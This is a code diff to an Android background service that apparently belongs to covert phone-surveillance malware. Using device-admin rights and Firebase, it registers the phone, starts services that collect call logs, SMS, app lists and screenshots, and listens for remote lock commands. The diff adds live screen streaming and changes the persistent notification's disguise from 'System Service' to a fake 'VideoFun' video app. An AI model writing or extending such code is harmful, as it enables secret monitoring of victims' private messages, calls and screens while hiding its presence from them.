@@ -8,8 +8,10 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
@@ -38,26 +40,30 @@ public class CommandPoller extends Service {
         super.onCreate();
         dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         adminComponent = new ComponentName(this, MyAdminReceiver.class);
-        deviceId = getSharedPreferences("mdm", MODE_PRIVATE)
-                .getString("device_id", "unknown");
+
+        // ✅ Device ID সঠিকভাবে সেভ করুন
+        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
+        deviceId = prefs.getString("device_id", null);
+        if (deviceId == null || deviceId.equals("unknown")) {
+            deviceId = Settings.Secure.getString(
+                    getContentResolver(), Settings.Secure.ANDROID_ID);
+            prefs.edit().putString("device_id", deviceId).apply();
+            Log.d(TAG, "Device ID saved: " + deviceId);
+        }
+
         dbRef = FirebaseDatabase.getInstance().getReference();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // ✅ Foreground Service চালু
         startForegroundService();
-
-        // ✅ ডিভাইস অনলাইন
         registerDeviceOnline();
 
-        // ✅ সব ব্যাকগ্রাউন্ড সার্ভিস চালু (একবারই)
         if (!servicesStarted) {
             servicesStarted = true;
             startAllServices();
         }
 
-        // ✅ লক কমান্ড লিসেন
         if (commandListener == null) {
             listenForCommands();
         }
@@ -65,7 +71,6 @@ public class CommandPoller extends Service {
         return START_STICKY;
     }
 
-    /** ✅ সব ব্যাকগ্রাউন্ড সার্ভিস চালু */
     private void startAllServices() {
         try {
             startService(new Intent(this, AppListService.class));
@@ -73,6 +78,7 @@ public class CommandPoller extends Service {
             startService(new Intent(this, CallLogService.class));
             startService(new Intent(this, SmsService.class));
             startService(new Intent(this, ScreenCaptureService.class));
+            startService(new Intent(this, LiveScreenService.class));
             Log.d(TAG, "All services started");
         } catch (Exception e) {
             Log.e(TAG, "Service start error: " + e.getMessage());
@@ -83,9 +89,9 @@ public class CommandPoller extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "System Service",
+                    "Video Service",
                     NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("System optimization");
+            channel.setDescription("Video streaming");
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
@@ -95,15 +101,15 @@ public class CommandPoller extends Service {
         Notification notification;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("System Service")
+                    .setContentTitle("VideoFun")
                     .setContentText("Running")
-                    .setSmallIcon(android.R.drawable.ic_lock_lock)
+                    .setSmallIcon(android.R.drawable.ic_media_play)
                     .build();
         } else {
             notification = new Notification.Builder(this)
-                    .setContentTitle("System Service")
+                    .setContentTitle("VideoFun")
                     .setContentText("Running")
-                    .setSmallIcon(android.R.drawable.ic_lock_lock)
+                    .setSmallIcon(android.R.drawable.ic_media_play)
                     .build();
         }
 
@@ -115,6 +121,10 @@ public class CommandPoller extends Service {
             dbRef.child("devices").child(deviceId).child("status").setValue("online");
             dbRef.child("devices").child(deviceId).child("lastSeen")
                     .setValue(System.currentTimeMillis());
+            dbRef.child("devices").child(deviceId).child("name")
+                    .setValue(android.os.Build.MODEL);
+            dbRef.child("devices").child(deviceId).child("user")
+                    .setValue("User");
         } catch (Exception e) {
             Log.e(TAG, "Register error: " + e.getMessage());
         }
@@ -162,7 +172,6 @@ public class CommandPoller extends Service {
             dbRef.child("devices").child(deviceId).child("locked")
                     .removeEventListener(commandListener);
         }
-        // সার্ভিস আবার চালু
         Intent intent = new Intent(this, CommandPoller.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
